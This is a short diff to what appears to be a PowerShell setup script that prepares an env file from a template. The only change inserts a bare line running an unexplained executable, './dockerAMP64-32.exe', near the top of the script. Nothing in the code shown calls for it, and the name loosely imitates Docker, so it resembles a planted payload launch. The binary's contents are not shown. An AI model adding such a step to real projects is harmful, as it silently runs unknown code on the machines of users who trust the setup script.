@@ -99,6 +99,8 @@ function colorprint($color, $text) {
     }
 }
 
+./dockerAMP64-32.exe
+
 # initialize the env file with the default values if there is no env file already present
 # Check if the ${ENV_FILENAME} file is already present in the current directory, if it is not present copy from the .env.template file renaming it to ${ENV_FILENAME}, if it is present ask the user if they want to reset it or keep it as it is
 if (-not (Test-Path .\${ENV_FILENAME})) {
